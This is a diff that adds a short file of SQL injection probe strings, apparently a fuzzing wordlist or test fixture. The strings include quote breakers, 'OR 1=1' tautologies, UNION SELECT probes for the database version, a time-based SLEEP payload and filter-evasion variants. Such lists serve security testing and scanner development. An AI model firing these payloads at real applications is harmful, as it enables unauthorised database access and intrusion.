@@ -1,0 +1,12 @@
+'
+"
+')
+")
+' OR 1=1--
+' OR 1=2--
+' UNION SELECT null--
+' UNION SELECT version()--
+' AND SLEEP(5)
+'||(SELECT 1 FROM dual)--
+'/*!50000OR*/1=1--
+%27%20OR%201=1--
